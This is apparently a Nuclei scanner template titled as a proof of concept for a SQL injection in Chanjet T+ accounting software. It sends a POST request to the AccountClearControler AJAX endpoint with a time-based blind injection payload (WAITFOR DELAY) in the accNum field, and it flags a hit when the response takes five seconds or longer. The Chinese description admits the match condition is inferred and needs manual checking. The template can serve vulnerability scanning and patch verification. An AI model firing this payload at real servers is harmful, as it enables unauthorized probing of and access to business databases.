id: poc-ogw84r30q5u6gl3c
info:
  name: 畅捷通TPLUS AccountClearControler SQL注入
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Content-Length: 45


    {"accNum": "3'' WAITFOR DELAY ''0:0:5''-- QoLY"}'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
